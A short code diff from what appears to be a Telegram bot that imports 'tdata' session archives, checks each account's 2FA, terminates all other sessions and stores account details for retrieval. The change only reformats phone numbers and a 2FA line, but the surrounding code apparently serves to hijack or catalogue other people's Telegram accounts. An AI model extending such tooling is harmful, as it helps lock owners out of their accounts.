@@ -288,9 +288,9 @@ async def handle_archive(client, message):
                 with open(clean_zip_path, "rb") as f:
                     tdata_bytes = f.read()
                 syd = await check_2fa(tele_client)
-                await message.reply(f"{idx} ~ {me.phone}: {syd}")
+                await message.reply(f"{idx} ~ +{me.phone}: {syd}")
                 nsyd = await terminate_all_other_sessions(tele_client)
-                await message.reply(f"{idx} ~ {me.phone}: {nsyd}")
+                await message.reply(f"{idx} ~ +{me.phone}: {nsyd}")
                 info = {
                     "name": me.first_name or "?",
                     "phone": me.phone or "?",
@@ -398,7 +398,7 @@ async def retrieve_account(client, message):
         f"Account #: {acc_num}\n"
         f"Name: {doc['name']}\n"
         f"Phone: {doc['phone']}\n"
-        f"2FA: {doc['twofa']}\n"
+        f"{doc['twofa']}\n"
      #   f"Spam: {doc['spam']}\n"
         f"Status: {status}"
     )
